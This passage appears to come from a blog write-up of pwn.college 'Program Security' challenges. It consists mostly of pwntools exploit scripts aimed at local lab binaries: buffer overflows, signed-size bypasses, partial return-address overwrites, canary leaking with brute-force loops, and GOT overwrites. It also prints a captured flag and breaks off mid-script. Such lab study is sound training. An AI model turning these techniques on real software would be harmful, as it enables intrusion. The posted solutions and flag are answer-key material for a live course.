+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [12]: from pwn import *                                                                      │by directly overflowing into the stored return address back to main,<br>    ...:                                                                                        │which is stored at 0x7fffebb65298, 136 bytes after the start of your input buffer.<br>    ...: p = process(&#x27;/challenge/bounds-breaker-easy&#x27;)                                          │That means that you will need to input at least 144 bytes (115 to fill the buffer,<br>    ...:                                                                                        │21 to fill other stuff stored between the buffer and the return address,<br>    ...: out=p.recvuntil(b&#x27;Payload size:&#x27;)                                                      │and 8 that will overwrite the return address).<br>    ...: offset = 0x88                                                                          │<br>    ...: #ps = b&quot;A\x00&quot;                                                                         │We have disabled the following standard memory corruption mitigations for this challenge:<br>    ...: nop_len = offset                                                                       │- the canary is disabled, otherwise you would corrupt it before<br>    ...: nop = b&quot;\x90&quot; * nop_len                                                                │overwriting the return address, and the program would abort.<br>    ...:                                                                                        │- the binary is *not* position independent. This means that it will be<br>    ...: payload = nop +p64( 0x402424)                                                          │located at the same spot every time it is run, which means that by<br>    ...:                                                                                        │analyzing the binary (using objdump or reading this output), you can<br>    ...: p.sendline(b&quot;-1&quot;)                                                                      │know the exact value that you need to overwrite the return address with.<br>    ...: out+=p.recvuntil(b&#x27;Send your payload&#x27;)                                                 │<br>    ...: p.send(payload)                                                                        │Payload size: 234234<br>    ...:                                                                                        │This challenge is more careful: it will check to make sure you<br>    ...: out += p.recvall(timeout=2)                                                            │don&#x27;t want to provide so much data that the input buffer will<br>    ...:                                                                                        │overflow. But recall twos compliment, look at how the check is<br>    ...:                                                                                        │implemented, and try to beat it!<br>    ...: print(out.decode(errors=&#x27;replace&#x27;))                                                    │Provided size is too large!<br>    ...: p.close()                                               <br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768812732315-e1383484-f371-451f-a8f8-414bdc0cf652.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Bounds-Breaker-Hard"><a href="#Bounds-Breaker-Hard" class="headerlink" title="Bounds Breaker (Hard)"></a><font style="color:#2F8EF4;">Bounds Breaker (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768813905477-8ee2b378-a84d-47f4-9bf8-ae1411ac9617.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Casting-Catastrophe-Easy"><a href="#Casting-Catastrophe-Easy" class="headerlink" title="Casting Catastrophe (Easy)"></a><font style="color:#2F8EF4;">Casting Catastrophe (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768844277442-23c98f7c-4d1d-4265-aedb-7454b0bf2a95.png" srcset="/img/loading.gif" lazyload></p>
+<p>easy</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768845870354-c6138678-6b68-4437-8095-a97b8abc2c2f.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [7]: from pwn import *<br>   ...: <br>   ...: p = process(&#x27;/challenge/casting-catastrophe-easy&#x27;)<br>   ...: <br>   ...: out=p.recvuntil(b&#x27;Number of payload records to send:&#x27;)<br>   ...: offset = 0x38<br>   ...: #ps = b&quot;A\x00&quot;<br>   ...: nop_len = offset<br>   ...: nop = b&quot;\x90&quot; * nop_len<br>   ...: <br>   ...: payload = nop +p64( 0x401edc)<br>   ...: <br>   ...: p.sendline(b&quot;2147483647&quot;)<br>   ...: out+=p.recvuntil(b&#x27;Size of each payload record:&#x27;)<br>   ...: p.sendline(b&quot;2147483647&quot;)<br>   ...: out+=p.recvuntil(b&#x27;Send your payload&#x27;)<br>   ...: p.send(payload)<br>   ...: <br>   ...: out += p.recvall(timeout=2)<br>   ...: <br>   ...: <br>   ...: print(out.decode(errors=&#x27;replace&#x27;))<br>   ...: p.close()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768845914246-5a8245a2-6812-44a9-9ed9-dced64fd53c2.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Casting-Catastrophe-Hard"><a href="#Casting-Catastrophe-Hard" class="headerlink" title="Casting Catastrophe (Hard)"></a><font style="color:#2F8EF4;">Casting Catastrophe (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768847179328-2c72753f-8e92-4f26-bc11-d4674a3c73eb.png" srcset="/img/loading.gif" lazyload></p>
+<p>perfect</p>
+<h5 id="Pointer-Problems-Easy"><a href="#Pointer-Problems-Easy" class="headerlink" title="Pointer Problems (Easy)"></a><font style="color:#2F8EF4;">Pointer Problems (Easy)</font></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [15]: from pwn import *                                                                                                                                                                       <br>    ...: import re                                                                                                                                                                               <br>    ...: p = process(&#x27;/challenge/pointer-problems-easy&#x27;)                                                                                                                                         <br>    ...:                                                                                                                                                                                         <br>    ...: out=p.recvuntil(b&#x27;Payload size:&#x27;)                                                                                                                                                       <br>    ...: flag_addr_match = re.search(br&#x27;flag\s+is\s+located\s+at\s+(0x[0-9a-f]+)&#x27;, out)                                                                                                          <br>    ...: if not flag_addr_match:                                                                                                                                                                 <br>    ...:     print(&quot;Failed to find flag address!&quot;)                                                                                                                                               <br>    ...:     exit(1)                                                                                                                                                                             <br>    ...:                                                                                                                                                                                         <br>    ...: flag_addr = int(flag_addr_match.group(1), 16)                                                                                                                                           <br>    ...: print(f&quot;Flag address: &#123;hex(flag_addr)&#125;&quot;)                                                                                                                                                <br>    ...:                                                                                                                                                                                         <br>    ...: offset = 56                                                                                                                                                                             <br>    ...: #ps = b&quot;A\x00&quot;                                                                                                                                                                          <br>    ...: nop_len = offset                                                                                                                                                                        <br>    ...: nop = b&quot;\x90&quot; * nop_len                                                                                                                                                                 <br>    ...: #gdb.attach(p)                                                                                                                                                                          <br>    ...: payload = nop +p64( flag_addr)                                                                                                                                                          <br>    ...:                                                                                                                                                                                         <br>    ...: p.sendline(b&quot;999&quot;)                                                                                                                                                                      <br>    ...: out+=p.recvuntil(b&#x27;Send your payload&#x27;)                                                                                                                                                  <br>    ...: p.send(payload)                                                                                                                                                                         <br>    ...:                                                                                                                                                                                         <br>    ...: out += p.recvall(timeout=2)                                                                                                                                                             <br>    ...:                                                                                                                                                                                         <br>    ...:                                                                                                                                                                                         <br>    ...: print(out.decode(errors=&#x27;replace&#x27;))                                                                                                                                                     <br>    ...: p.close()                                    <br></code></pre></td></tr></table></figure>
+
+<p>easy</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769069797198-9af67b1f-7728-42a0-b28c-582f423f6c80.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Pointer-Problems-Hard"><a href="#Pointer-Problems-Hard" class="headerlink" title="Pointer Problems (Hard)"></a><font style="color:#2F8EF4;">Pointer Problems (Hard)</font></h5><p>back to easy</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769072377814-755cda7e-7c54-49be-aa18-9a3220324cd4.png" srcset="/img/loading.gif" lazyload></p>
+<p>we find char*</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769072429644-fc1409a5-a795-433e-abe2-fa64a3d73e75.png" srcset="/img/loading.gif" lazyload></p>
+<p>buffer is at rbp-0x50</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769073063502-1c426a15-d103-4f5d-b0cc-7ab82653c624.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag</p>
+<p>return hard</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769074073264-9386a28d-88f3-438b-99bb-83d8c4c0cf5b.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag is here</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769074171310-a150f5ee-5fb2-43b2-ab66-905e4280e53e.png" srcset="/img/loading.gif" lazyload></p>
+<p>as the same , offset &#x3D; 0x38</p>
+<p>we can overwrite the low 2 byte</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769081857858-7f9ffc0c-20b5-425d-aaee-ac9e57e3ea4a.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain">                                                                                                                                                                                                 <br>In [33]: from pwn import *                                                                                                                                                                       <br>    ...: import re                                                                                                                                                                               <br>    ...: p = process(&#x27;/challenge/pointer-problems-hard&#x27;)                                        <br>    ...:                                        <br>    ...: out=p.recvuntil(b&#x27;Payload size:&#x27;)<br>    ...:                                        <br>    ...: flag_addr = 0x5040                     <br>    ...:                                        <br>    ...: offset = 56                            <br>    ...: #ps = b&quot;A\x00&quot;                         <br>    ...: nop_len = offset                       <br>    ...: nop = b&quot;\x90&quot; * nop_len                <br>    ...: #gdb.attach(p)                         <br>    ...: #pause()                               <br>    ...: payload = nop +p16( flag_addr)         <br>    ...:                                        <br>    ...: p.sendline(b&quot;999&quot;)                     <br>    ...: out+=p.recvuntil(b&#x27;Send your payload&#x27;)<br>    ...: p.send(payload)                        <br>    ...:                                        <br>    ...: out += p.recvall(timeout=2)            <br>    ...:                                        <br>    ...:                                        <br>    ...: print(out.decode(errors=&#x27;replace&#x27;))<br>    ...: p.close()                   <br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769082893190-e1525dad-1a0a-461f-8f2f-c19bd3a6a8d4.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Anomalous-Array-Easy"><a href="#Anomalous-Array-Easy" class="headerlink" title="Anomalous Array (Easy)"></a><font style="color:#2F8EF4;">Anomalous Array (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769154885593-678a8679-03d5-4a2e-b1ef-79a69efcc5a2.png" srcset="/img/loading.gif" lazyload></p>
+<p>each index is 8 byte</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769155003315-8f2d8ccf-52ba-4e1b-9dba-952a1290de83.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag is in the stack</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769155124658-528d87c9-d8a2-41f9-bdf3-7b2a855a79ce.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769157113444-116ec0ae-9d4b-4a59-9426-f5b6cc50a1b3.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769157129135-1c66b79a-7366-46a0-af6f-d68198648680.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769159729748-357fd8b9-3846-4b7c-b4ff-2de36b156ced.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag is at rbp - 0xb70</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769160882059-14a00c2c-d5af-4f52-b85e-054062ed3885.png" srcset="/img/loading.gif" lazyload></p>
+<p>array is at rbp +0x12a*8 -0xb70 &#x3D; rbp - 0x220</p>
+<p>0x220 - 0xb70 &#x3D; -2384</p>
+<h5 id="Anomalous-Array-Hard"><a href="#Anomalous-Array-Hard" class="headerlink" title="Anomalous Array (Hard)"></a><font style="color:#2F8EF4;">Anomalous Array (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769161408093-42c97576-b3ab-4066-824c-9980b83e2ad6.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769161602351-3cf4d171-458a-42ce-97bf-dfccf43c4501.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769169214881-b3afce27-fc8a-49fc-8187-971ca052ca2b.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain">hex_strings = [<br>    &quot;6c6c6f632e6e7770&quot;,<br>    &quot;6679496f7b656765&quot;,<br>    &quot;70426433546a7278&quot;,<br>    &quot;4170374964636778&quot;,<br>    &quot;2e77544b34303376&quot;,<br>    &quot;784f4463344e5630&quot;,<br>    &quot;304f44457a4e5377&quot;,<br>    &quot;a7d577a45&quot;<br>]<br><br>flag = &quot;&quot;<br>for hex_str in hex_strings:<br>    if len(hex_str) &lt; 16:<br>        hex_str = hex_str.zfill(16)<br>    <br>    bytes_data = bytes.fromhex(hex_str)<br>    reversed_bytes = bytes_data[::-1]<br>    <br>    for b in reversed_bytes:<br>        if 32 &lt;= b &lt;= 126:  # 可打印ASCII范围<br>            flag += chr(b)<br>        else:<br>            flag += &quot;.&quot;<br><br>print(&quot;Flag:&quot;, flag)<br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(97, 102, 107);"></font></p>
+<h5 id="Now-you-got-it-Easy"><a href="#Now-you-got-it-Easy" class="headerlink" title="Now you got it (Easy)"></a><font style="color:#2F8EF4;">Now you got it (Easy)</font></h5><p>disass the challenge</p>
+<p>we can find that ,offset &#x3D; (got_function_addr - (bssdata + 8)) &#x2F; 8 - 0x22</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769276672262-692984bf-b217-4527-b9b0-2009132cc98a.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769189118551-4dee9656-4846-42d3-8465-371964fc1a14.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Now-you-got-it-Hard"><a href="#Now-you-got-it-Hard" class="headerlink" title="Now you got it (Hard)"></a><font style="color:#2F8EF4;">Now you got it (Hard)</font></h5><p>disass the challenge</p>
+<p>we find that </p>
+<p>the hacking number is at <font style="color:rgb(97, 102, 107);background-color:rgb(235, 238, 242);">bssdata + (index + 0x1dc) * 8</font></p>
+<p>so , array_base &#x3D; bssdata + 0x1dc*8</p>
+<p>index &#x3D; (got_function_addr - array_base) &#x2F; 8</p>
+<p>we replace the puts</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769281665611-48192c97-85c4-4dd5-afd7-e54742e4fbb3.png" srcset="/img/loading.gif" lazyload></p>
+<p>?????</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769281736369-5a8de5d4-a00a-4236-b8cf-3076944ac87e.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgb(204, 235, 255);">After replace got.puts,</font>the win call the puts at start and then return to win</p>
+<p>so , we can  replace win +20</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769282493263-37a5245d-842e-40a0-a319-df134bab107e.png" srcset="/img/loading.gif" lazyload></p>
+<p>pwn.college{wUhtQ9GveAmDSqCl2fhOSHa0cYI.01N4cDOxwSNzEDO0EzW}</p>
+<h5 id="Loop-Lunacy-Easy"><a href="#Loop-Lunacy-Easy" class="headerlink" title="Loop Lunacy (Easy)"></a><font style="color:#2F8EF4;">Loop Lunacy (Easy)</font></h5><p>we can use “N” to pass canary</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769412052181-eef3125d-2737-484a-8125-62240c997c50.png" srcset="/img/loading.gif" lazyload></p>
+<p>return to 0x22bf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>In [55]: from pwn import *<br>    ...: #for i in range(10):<br>    ...: p = process(&#x27;/challenge/loop-lunacy-easy&#x27;)<br>    ...: payload = b&#x27;&#x27;<br>    ...: <br>    ...: size = b&#x27;58&#x27;<br>    ...: out=p.recvuntil(b&#x27;Payload size:&#x27;)<br>    ...: <br>    ...: p.sendline(size)<br>    ...: payload += b&#x27;a&#x27; * 36 +p8(55)+ p8(0xbf) +p8(0x62)<br>    ...:     # payload += p64(0x4014c4)<br>    ...: <br>    ...: <br>    ...: p.sendlineafter(&#x27;bytes)!&#x27;, payload)<br>    ...: <br>    ...: out+=p.recvall(timeout = 2 )<br>    ...: print(out.decode())<br>    ...: <br>    ...: p.close()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769412135436-4b2b04b5-9f9f-4b44-ad19-e23bf3760da2.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Loop-Lunacy-Hard"><a href="#Loop-Lunacy-Hard" class="headerlink" title="Loop Lunacy (Hard)"></a><font style="color:#2F8EF4;">Loop Lunacy (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769414682033-a5a18764-7ead-40c4-8445-fd7100c21344.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769414770995-5b09b47a-3315-4695-b931-52736b46e290.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [7]: from pwn import *                                                                                                                                                                        <br>   ...: #for i in range(10):                                                                                                                                                                     <br>   ...: while 1:                                                                                                                                                                                 <br>   ...:                                                                                                                                                                                          <br>   ...:                                                                                                                                                                                          <br>   ...:     p = process(&#x27;/challenge/loop-lunacy-hard&#x27;)                                                                                                                                           <br>   ...:     payload = b&#x27;&#x27;                                                                                                                                                                        <br>   ...:                                                                                                                                                                                          <br>   ...:     size = b&#x27;122&#x27;                                                                                                                                                                        <br>   ...:     out=p.recvuntil(b&#x27;Payload size:&#x27;)                                                                                                                                                    <br>   ...:                                                                                                                                                                                          <br>   ...:     p.sendline(size)                                                                                                                                                                     <br>   ...:     payload += b&#x27;a&#x27; * 92 +p8(119)+ p8(0x02) +p8(0x6b)                                                                                                                                    <br>   ...:     # payload += p64(0x4014c4)                                                                                                                                                           <br>   ...:                                                                                                                                                                                          <br>   ...:                                                                                                                                                                                          <br>   ...:     p.sendlineafter(&#x27;bytes)!&#x27;, payload)                                                                                                                                                  <br>   ...:                                                                                                                                                                                          <br>   ...:     out+=p.recvall(timeout = 2 )                                                                                                                                                         <br>   ...:     #print(out.decode())                                                                                                                                                                 <br>   ...:     if b&#x27;pwn&#x27; in out :                                                                                                                                                                   <br>   ...:         break                                                                                                                                                                            <br>   ...:     p.close()                                                                                                                                                                            <br>   ...:                                                                                                                                                                                          <br>   ...: print(out.decode(errors=&#x27;ignore&#x27;))                             <br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769414824684-38c11f74-c666-4d89-9a95-74906390a84b.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Nosy-Neighbor-Easy"><a href="#Nosy-Neighbor-Easy" class="headerlink" title="Nosy Neighbor (Easy)"></a><font style="color:#2F8EF4;">Nosy Neighbor (Easy)</font></h5><p>easy</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769415669934-48dfd868-0e8a-403f-8844-d80f6e15bc46.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Nosy-Neighbor-Hard"><a href="#Nosy-Neighbor-Hard" class="headerlink" title="Nosy Neighbor (Hard)"></a><font style="color:#2F8EF4;">Nosy Neighbor (Hard)</font></h5><p> 0x0000000000002151 &lt;+97&gt;:    lea    rax,[rbp-0x140]</p>
+<p>   0x0000000000002158 &lt;+104&gt;:   add    rax,0x2a</p>
+<p>offset &#x3D; 0x2a</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769416723672-97966cc3-00b4-4017-8c82-d8cd6438d5cc.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Recursive-Ruin-Easy"><a href="#Recursive-Ruin-Easy" class="headerlink" title="Recursive Ruin (Easy)"></a><font style="color:#2F8EF4;">Recursive Ruin (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769420708227-bc25a213-9933-4165-83f7-8417343e6215.png" srcset="/img/loading.gif" lazyload></p>
+<p>call challenge ?</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769420757715-2681e5ed-2e0b-4bbd-9152-28a8e3bc5ad5.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [2]: from pwn import *<br>   ...: <br>   ...: <br>   ...: while 1:<br>   ...:     try:<br>   ...: <br>   ...:         p = process(&#x27;/challenge/recursive-ruin-easy&#x27;)<br>   ...: <br>   ...: <br>   ...:         p.sendlineafter(b&#x27;Payload size:&#x27;, b&#x27;137&#x27;)<br>   ...: <br>   ...:         payload_1 = b&#x27;A&#x27; * 130 + b&#x27;REPEAT&#x27; + b&#x27;A&#x27;<br>   ...:         p.sendafter(b&#x27;bytes)!&#x27;, payload_1)<br>   ...: <br>   ...:         p.recvuntil(b&#x27;REPEAT&#x27;)<br>   ...:         p.recv(1)<br>   ...:         canary_parts = p.recv(7)<br>   ...:         canary = u64(b&#x27;\x00&#x27; + canary_parts)<br>   ...:         log.success(f&quot;Canary: &#123;hex(canary)&#125;&quot;)<br>   ...: <br>   ...: <br>   ...:         win_low = 0x0c99 | (random.randint(0, 15) &lt;&lt; 12)<br>   ...: <br>   ...:         p.sendlineafter(b&#x27;Payload size:&#x27;, b&#x27;160&#x27;)<br>   ...: <br>   ...: <br>   ...:         payload_1 = b&#x27;a&#x27; * 136 + p64(canary) + b&#x27;a&#x27; * 8 + p16(win_low)<br>   ...:         p.sendafter(b&#x27;bytes)!&#x27;, payload_1)<br>   ...: <br>   ...:         out = p.recvall(timeout=2)<br>   ...:         if b&#x27;pwn&#x27; in out:<br>   ...:             print(out.decode(errors=&#x27;ignore&#x27;))<br>   ...:             break<br>   ...: <br>   ...:         p.close()<br>   ...:     except:<br>   ...:         p.close()<br>   ...: <br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1769441799065-2ec99947-c0a0-4001-a3d9-29a0a0a8f1a7.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Recursive-Ruin-Hard"><a href="#Recursive-Ruin-Hard" class="headerlink" title="Recursive Ruin (Hard)"></a><font style="color:#2F8EF4;">Recursive Ruin (Hard)</font></h5><p>easy</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [1]: from pwn import *<br>   ...: <br>   ...: <br>   ...: while 1:<br>   ...:     try:<br>   ...: <br>   ...:         p = process(&#x27;/challenge/recursive-ruin-hard&#x27;)<br>   ...: <br>   ...: <br>   ...:         p.sendlineafter(b&#x27;Payload size:&#x27;, b&#x27;137&#x27;)<br>   ...: <br>   ...:         